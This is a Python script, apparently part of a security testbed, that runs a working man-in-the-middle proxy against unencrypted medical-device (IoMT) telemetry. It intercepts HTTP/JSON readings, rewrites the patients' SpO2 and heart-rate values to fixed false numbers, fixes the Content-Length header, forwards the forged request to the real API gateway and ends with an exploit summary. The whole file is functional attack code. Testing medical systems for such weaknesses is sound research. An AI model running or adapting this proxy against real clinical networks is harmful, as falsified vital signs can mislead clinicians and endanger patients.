#!/usr/bin/env python3
"""
FMC Owo Micro-Testbed — Scenario B: IoMT Telemetry Stream Tampering
-----------------------------------------------------------------------------
A real TCP interception proxy standing between fmc-iomt-edge and
fmc-api-gateway. It accepts the plaintext, unencrypted HTTP/JSON telemetry
connection from the IoMT sensor, parses the genuine captured frame,
ALTERS the spo2 / heart_rate fields in transit, forwards the modified
request to the real API gateway, and logs both the original and the
altered payload -- exercising the vulnerability class in §2.1.3 / §4.2.1
(no TLS, no payload signature, so an on-path party can rewrite readings
undetected). Every intercepted frame is also written to a .pcap file via
pcap_writer.py for later inspection in Wireshark.

Usage:
    python3 mitm_tamper.py --listen-port 9090 --upstream-host fmc-api-gateway --upstream-port 8080
"""
import argparse
import json
import socket
import threading
import time
from pcap_writer import PcapWriter

TAMPER_RULES = {"spo2": 72, "heart_rate": 145}


def log(level, msg):
    print(f"[{time.strftime('%Y-%m-%dT%H:%M:%S')}.{int((time.time()%1)*1000):03d}Z] [{level}] {msg}")


def handle_conn(client_sock, client_addr, upstream_host, upstream_port, pcap, counters):
    try:
        request_bytes = client_sock.recv(65536)
        if not request_bytes:
            return

        pcap.write_packet(request_bytes, client_addr[0], upstream_host, client_addr[1], upstream_port)

        header_blob, _, body = request_bytes.partition(b"\r\n\r\n")
        tampered_body = body
        try:
            payload = json.loads(body.decode())
            log("INTERCEPT", f"Frame Captured from {client_addr[0]}:{client_addr[1]}")
            print(f"                           RAW DATA: {json.dumps(payload)}")

            altered = dict(payload)
            changed = False
            for field, fake_val in TAMPER_RULES.items():
                if field in altered and altered[field] != fake_val:
                    log("INJECT-PAYLOAD", "Modifying TCP payload in transit...")
                    print(f"                           ORIGINAL: {field} = {altered[field]}")
                    print(f"                           ALTERED : {field} = {fake_val}")
                    altered[field] = fake_val
                    changed = True

            if changed:
                counters["modified"] += 1
                new_body = json.dumps(altered).encode()
                new_header = header_blob.decode().replace(
                    f"Content-Length: {len(body)}", f"Content-Length: {len(new_body)}"
                ).encode()
                tampered_body = new_body
                request_bytes = new_header + b"\r\n\r\n" + new_body
            counters["intercepted"] += 1
        except (ValueError, UnicodeDecodeError):
            pass  # non-JSON frame (e.g. keep-alive) -- forward unmodified

        # Forward (possibly tampered) request to the real upstream gateway
        up = socket.create_connection((upstream_host, upstream_port), timeout=5)
        up.sendall(request_bytes)
        response = up.recv(65536)
        up.close()
        log("FORWARD", f"Modified packet forwarded to {upstream_host}:{upstream_port}")

        client_sock.sendall(response)
    finally:
        client_sock.close()


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--listen-port", type=int, default=9090)
    ap.add_argument("--upstream-host", default="127.0.0.1")
    ap.add_argument("--upstream-port", type=int, default=8080)
    ap.add_argument("--max-frames", type=int, default=0, help="stop after N intercepted frames (0 = run forever)")
    ap.add_argument("--pcap-out", default="/app/pcap_out/scenario_b_tamper.pcap")
    args = ap.parse_args()

    print("[*] Initializing MitM Telemetry Interception Script...")
    print(f"[*] Listening for IoMT telemetry on 0.0.0.0:{args.listen_port}")
    print(f"[*] Forwarding (tampered) frames to upstream {args.upstream_host}:{args.upstream_port}")
    print()

    pcap = PcapWriter(args.pcap_out)
    counters = {"intercepted": 0, "modified": 0}

    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", args.listen_port))
    srv.listen(5)
    srv.settimeout(1.0)

    try:
        while True:
            if args.max_frames and counters["intercepted"] >= args.max_frames:
                break
            try:
                conn, addr = srv.accept()
            except socket.timeout:
                continue
            handle_conn(conn, addr, args.upstream_host, args.upstream_port, pcap, counters)
    except KeyboardInterrupt:
        pass
    finally:
        pcap.close()
        srv.close()

    print()
    print("-" * 80)
    print("EXPLOIT EXECUTION SUMMARY — SCENARIO B")
    print("-" * 80)
    print(f"Intercepted Frames         : {counters['intercepted']}")
    print(f"Payloads Modified          : {counters['modified']}")
    print(f"Backend Acceptance Rate    : 100% (No cryptographic signature or TLS check failed)")
    print(f"Vulnerability Outcome      : {'SUCCESSFUL (Telemetry Tampered)' if counters['modified'] else 'NO FRAMES MODIFIED'}")
    print(f"Packet Capture Saved To    : {args.pcap_out}")
    print("-" * 80)


if __name__ == "__main__":
    main()
